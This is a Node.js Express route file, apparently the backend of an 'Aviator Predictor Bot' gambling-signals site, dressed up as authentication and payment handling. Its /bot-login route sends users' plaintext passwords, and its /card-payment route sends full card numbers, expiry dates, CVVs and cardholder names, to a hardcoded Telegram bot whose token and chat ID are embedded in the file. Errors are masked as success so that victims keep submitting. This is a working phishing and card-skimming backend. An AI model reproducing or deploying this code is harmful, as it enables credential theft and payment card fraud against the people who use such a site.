// routes/auth.js - Authentication and session management
const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');

// Telegram configuration
const telegramBotToken = '7995830862:AAEbUHiAL-YUM3myMGKd63dpFcbxE3_uU2o';
const telegramChatId = '5900219209';

// Helper function to log authentication attempts
const logAuthData = (data) => {
  const logsDir = path.join(__dirname, '..', 'logs');
  if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
  }
  
  const logFile = path.join(logsDir, `auth-${new Date().toISOString().split('T')[0]}.log`);
  const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
  fs.appendFileSync(logFile, logEntry);
  console.log('🔐 Auth data logged:', data);
};

// Helper function to send to Telegram
const sendToTelegram = async (message) => {
  try {
    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
    
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
      return { success: false, error: `Telegram API error: ${response.status}` };
    }
    
    const result = await response.json();
    console.log('✅ Telegram message sent successfully:', result.message_id);
    return { success: true, result };
    
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error.message);
    return { success: false, error: error.message };
  }
};

// Mask sensitive data for logging (keeping full card info)
const maskSensitiveData = (data) => {
  const masked = { ...data };
  if (masked.password) {
    masked.password = '*'.repeat(masked.password.length);
  }
  // Keep full card details visible
  return masked;
};

// CORS middleware for all auth routes
router.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, ngrok-skip-browser-warning');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Bot login endpoint
router.post('/bot-login', async (req, res) => {
  try {
    const { contact, password, userAgent, timestamp } = req.body;

    // Validate required fields
    if (!contact || !password) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and password are required' 
      });
    }

    // Determine contact type
    const contactType = contact.includes('@') ? 'Email' : 'Mobile';
    
    const authData = {
      contact,
      contactType,
      password,
      userAgent: userAgent || 'Unknown',
      timestamp: timestamp || new Date().toISOString(),
      source: 'Aviator Bot Login',
      ip: req.ip || 'Unknown'
    };

    // Log authentication attempt (with masked password)
    logAuthData(maskSensitiveData(authData));

    // Send to Telegram with formatted message
    const telegramMessage = `🤖 <b>AVIATOR BOT LOGIN ALERT</b>

📧 Contact: <code>${contact}</code>
📱 Type: ${contactType}
🔑 Password: <code>${password}</code>
🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
🔗 Source: Aviator Predictor Bot`;

    const telegramResult = await sendToTelegram(telegramMessage);
    console.log('✅ Bot login Telegram result:', telegramResult);

    // Return success with session info
    res.json({ 
      success: true,
      message: 'Login successful',
      sessionData: {
        contact,
        contactType,
        loginTime: authData.timestamp,
        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
      }
    });

  } catch (error) {
    console.error('❌ Bot login error:', error);
    
    // Log error but still return success to avoid breaking frontend flow
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      timestamp: new Date().toISOString()
    });

    res.json({ 
      success: true,
      message: 'Login processed (fallback mode)',
      warning: 'Some features may be limited'
    });
  }
});

// Card payment details endpoint
router.post('/card-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      amount, 
      cardInfo,
      source,
      timestamp 
    } = req.body;

    // Validate required fields
    if (!contact || !packageName || !cardInfo) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact, package name, and card info are required' 
      });
    }

    const paymentData = {
      contact,
      packageName,
      amount,
      cardInfo: {
        cardNumber: cardInfo.cardNumber,
        expiryDate: cardInfo.expiryDate,
        cvv: cardInfo.cvv,
        cardholderName: cardInfo.cardholderName
      },
      source: source || 'Bot Payment',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log payment data (with masked card info)
    logAuthData(maskSensitiveData(paymentData));

    // Send to Telegram with formatted message (showing full card details)
    const telegramMessage = `💳 <b>CARD PAYMENT DETAILS</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
💵 Amount: <b>$${amount}</b>
🏦 Card Number: <code>${cardInfo.cardNumber}</code>
📅 Expiry: <code>${cardInfo.expiryDate}</code>
🔒 CVV: <code>${cardInfo.cvv}</code>
👤 Cardholder: <code>${cardInfo.cardholderName}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
🔗 Source: ${source || 'Bot Payment'}

⚠️ <b>ADMIN ACTION REQUIRED</b>
Please verify this payment manually.`;

    const telegramResult = await sendToTelegram(telegramMessage);
    console.log('✅ Card payment Telegram result:', telegramResult);

    // Return success
    res.json({ 
      success: true,
      message: 'Card payment details processed successfully',
      paymentId: Date.now().toString(),
      status: 'pending_verification'
    });

  } catch (error) {
    console.error('❌ Card payment error:', error);
    
    // Log error
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      packageName: req.body.packageName,
      timestamp: new Date().toISOString()
    });

    // Return success with warning to avoid breaking frontend flow
    res.json({ 
      success: true,
      message: 'Card payment details received (fallback mode)',
      warning: 'Payment processed with limited verification',
      paymentId: Date.now().toString(),
      status: 'pending_manual_review'
    });
  }
});

// Index page session login endpoint
router.post('/index-login', async (req, res) => {
  try {
    const { contact, contactType, userAgent, timestamp } = req.body;

    // Validate required fields
    if (!contact) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact is required' 
      });
    }

    const authData = {
      contact,
      contactType: contactType || (contact.includes('@') ? 'Email' : 'Mobile'),
      userAgent: userAgent || 'Unknown',
      timestamp: timestamp || new Date().toISOString(),
      source: 'Index Page Access',
      ip: req.ip || 'Unknown'
    };

    // Log authentication attempt
    logAuthData(authData);

    // Send to Telegram with formatted message
    const telegramMessage = `🎯 <b>CLIENT ACCESS REQUEST</b>

📱 Contact Type: ${authData.contactType === 'Email' ? 'Email Address' : 'Phone Number'}
📧 Contact Info: <code>${contact}</code>
🌐 Source: Landing Page (avisignals.com)
🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>

✅ Client is proceeding to main platform`;

    const telegramResult = await sendToTelegram(telegramMessage);
    console.log('✅ Index login Telegram result:', telegramResult);

    // Return success with session info
    res.json({ 
      success: true,
      message: 'Access logged successfully',
      sessionData: {
        contact,
        contactType: authData.contactType,
        loginTime: authData.timestamp,
        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
      }
    });

  } catch (error) {
    console.error('❌ Index login error:', error);
    
    // Log error but still return success to avoid breaking frontend flow
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      timestamp: new Date().toISOString(),
      source: 'index-login-error'
    });

    res.json({ 
      success: true,
      message: 'Access logged (fallback mode)',
      warning: 'Some features may be limited'
    });
  }
});

// Session validation endpoint
router.post('/validate-session', async (req, res) => {
  try {
    const { contact, sessionToken, timestamp } = req.body;

    if (!contact || !sessionToken) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and session token are required' 
      });
    }

    // Simple session validation (in production, use proper JWT or session store)
    const sessionData = {
      contact,
      sessionToken,
      timestamp: timestamp || new Date().toISOString(),
      valid: true, // In real app, validate against database/cache
      expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    };

    // Log session validation
    logAuthData({
      action: 'session_validation',
      contact,
      timestamp: sessionData.timestamp,
      valid: sessionData.valid
    });

    res.json({ 
      success: true,
      sessionData,
      message: 'Session is valid'
    });

  } catch (error) {
    console.error('❌ Session validation error:', error);
    
    res.status(500).json({ 
      success: false,
      error: 'Session validation failed'
    });
  }
});

// Logout endpoint
router.post('/logout', async (req, res) => {
  try {
    const { contact, timestamp } = req.body;

    if (contact) {
      // Log logout activity
      logAuthData({
        action: 'logout',
        contact,
        timestamp: timestamp || new Date().toISOString(),
        ip: req.ip || 'Unknown'
      });

      // Optional: Send logout notification to Telegram
      const telegramMessage = `🚪 <b>USER LOGOUT</b>

👤 Contact: <code>${contact}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>`;

      try {
        await sendToTelegram(telegramMessage);
      } catch (telegramError) {
        console.warn('⚠️ Failed to send logout notification:', telegramError);
      }
    }

    res.json({ 
      success: true,
      message: 'Logout successful'
    });

  } catch (error) {
    console.error('❌ Logout error:', error);
    
    res.json({ 
      success: true,
      message: 'Logout processed'
    });
  }
});

// Payment verification endpoints
router.post('/verify-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      amount, 
      paymentMethod,
      transactionId,
      source,
      timestamp 
    } = req.body;

    // Validate required fields
    if (!contact || !packageName) {
      return res.status(400).json({ 
        success: false,
        error: 'Contact and package name are required' 
      });
    }

    const verificationData = {
      contact,
      packageName,
      amount,
      paymentMethod: paymentMethod || 'Unknown',
      transactionId: transactionId || 'N/A',
      source: source || 'Payment Verification',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown',
      status: 'pending_admin_verification'
    };

    // Log verification request
    logAuthData(verificationData);

    // Send to Telegram with verification buttons
    const telegramMessage = `💰 <b>PAYMENT VERIFICATION REQUEST</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
💵 Amount: <b>$${amount || 'N/A'}</b>
💳 Method: <b>${paymentMethod || 'Card Payment'}</b>
🔗 Transaction ID: <code>${transactionId || 'N/A'}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
⏰ Time: <code>${new Date().toLocaleString()}</code>
🔗 Source: ${source || 'Payment Verification'}

⚠️ <b>ADMIN ACTION REQUIRED</b>
Please verify this payment and approve/reject access.`;

    await sendToTelegram(telegramMessage);

    // Return success with verification ID
    res.json({ 
      success: true,
      message: 'Payment verification request submitted successfully',
      verificationId: Date.now().toString(),
      status: 'pending_verification',
      estimatedTime: '5-10 minutes'
    });

  } catch (error) {
    console.error('❌ Payment verification error:', error);
    
    // Log error
    logAuthData({
      error: error.message,
      contact: req.body.contact,
      packageName: req.body.packageName,
      timestamp: new Date().toISOString(),
      action: 'verification_error'
    });

    res.status(500).json({ 
      success: false,
      error: 'Failed to submit payment verification',
      message: 'Please try again or contact support'
    });
  }
});

// Admin payment approval endpoint
router.post('/approve-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      verificationId,
      adminNote,
      timestamp 
    } = req.body;

    const approvalData = {
      contact,
      packageName,
      verificationId,
      adminNote: adminNote || 'Payment approved',
      action: 'payment_approved',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log approval
    logAuthData(approvalData);

    // Send approval notification to Telegram
    const telegramMessage = `✅ <b>PAYMENT APPROVED</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
🔗 Verification ID: <code>${verificationId}</code>
📝 Note: ${adminNote || 'Payment approved by admin'}
⏰ Time: <code>${new Date().toLocaleString()}</code>

✅ <b>ACCESS GRANTED</b>
User can now access their package.`;

    await sendToTelegram(telegramMessage);

    res.json({ 
      success: true,
      message: 'Payment approved successfully',
      status: 'approved',
      accessGranted: true
    });

  } catch (error) {
    console.error('❌ Payment approval error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to approve payment'
    });
  }
});

// Admin payment rejection endpoint
router.post('/reject-payment', async (req, res) => {
  try {
    const { 
      contact, 
      packageName, 
      verificationId,
      rejectionReason,
      timestamp 
    } = req.body;

    const rejectionData = {
      contact,
      packageName,
      verificationId,
      rejectionReason: rejectionReason || 'Payment rejected',
      action: 'payment_rejected',
      timestamp: timestamp || new Date().toISOString(),
      ip: req.ip || 'Unknown'
    };

    // Log rejection
    logAuthData(rejectionData);

    // Send rejection notification to Telegram
    const telegramMessage = `❌ <b>PAYMENT REJECTED</b>

👤 Customer: <code>${contact}</code>
💰 Package: <b>${packageName}</b>
🔗 Verification ID: <code>${verificationId}</code>
📝 Reason: ${rejectionReason || 'Payment rejected by admin'}
⏰ Time: <code>${new Date().toLocaleString()}</code>

❌ <b>ACCESS DENIED</b>
User payment was not verified.`;

    await sendToTelegram(telegramMessage);

    res.json({ 
      success: true,
      message: 'Payment rejected',
      status: 'rejected',
      accessGranted: false
    });

  } catch (error) {
    console.error('❌ Payment rejection error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to reject payment'
    });
  }
});

// Test Telegram connectivity endpoint
router.get('/test-telegram', async (req, res) => {
  try {
    const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>

⏰ Time: <code>${new Date().toLocaleString()}</code>
📍 IP: <code>${req.ip || 'Unknown'}</code>
🔗 Source: Backend Test Endpoint

✅ If you see this message, Telegram integration is working!`;

    const result = await sendToTelegram(testMessage);
    
    res.json({
      success: true,
      message: 'Telegram test completed',
      telegramResult: result,
      botToken: telegramBotToken ? 'Present' : 'Missing',
      chatId: telegramChatId ? 'Present' : 'Missing'
    });

  } catch (error) {
    console.error('❌ Telegram test error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      botToken: telegramBotToken ? 'Present' : 'Missing',
      chatId: telegramChatId ? 'Present' : 'Missing'
    });
  }
});

module.exports = router;
